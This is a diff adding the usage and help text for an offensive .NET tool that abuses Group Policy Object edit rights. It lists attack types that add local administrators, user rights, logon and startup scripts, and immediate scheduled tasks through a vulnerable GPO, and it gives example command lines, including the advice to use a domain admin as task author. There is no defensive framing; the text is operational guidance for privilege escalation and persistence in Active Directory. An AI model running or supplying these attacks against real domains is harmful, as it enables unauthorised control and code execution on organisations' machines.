@@ -1,0 +1,39 @@
+ABOUT
+    .NET tool to abuse GPO edit rights. Modifies Group Policy Objects to add user rights,
+    local admins, logon scripts, startup scripts, and immediate scheduled tasks.
+
+USAGE:
+    net-sharp-gpo-abuse --- <AttackType> <AttackOptions>
+
+ATTACK TYPES:
+    --AddUserRights      Add rights to a user
+    --AddLocalAdmin      Add user to local administrators group
+    --AddComputerScript  Add computer startup script
+    --AddUserScript      Add user logon script
+    --AddComputerTask    Add computer immediate scheduled task
+    --AddUserTask        Add user immediate scheduled task
+
+ATTACK OPTIONS:
+    --GPOName            Name of the vulnerable GPO (required)
+    --UserAccount        Target user account
+    --UserRights         Comma separated rights list (case sensitive)
+    --ScriptName         Script filename
+    --ScriptContents     Script contents
+    --TaskName           Scheduled task name
+    --Author             Task author (use DA account)
+    --Command            Command to execute
+    --Arguments          Arguments for the command
+    --FilterEnabled      Enable target filtering
+    --TargetUsername     Target user DOMAIN\USER for user tasks
+    --TargetUserSID      Target user SID
+    --TargetDnsName      Target computer DNS name for computer tasks
+
+ADDITIONAL OPTIONS:
+    --DomainController   Target domain controller
+    --Domain             Target domain
+    --Force              Overwrite existing files
+
+EXAMPLES:
+    net-sharp-gpo-abuse --- --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
+    net-sharp-gpo-abuse --- --AddUserScript --ScriptName Startup.bat --ScriptContents "cmd /c whoami" --GPOName "Vulnerable GPO"
+    net-sharp-gpo-abuse --- --AddComputerTask --TaskName Update --Author DOMAIN\Admin --Command cmd.exe --Arguments "/c whoami" --GPOName "Vulnerable GPO"
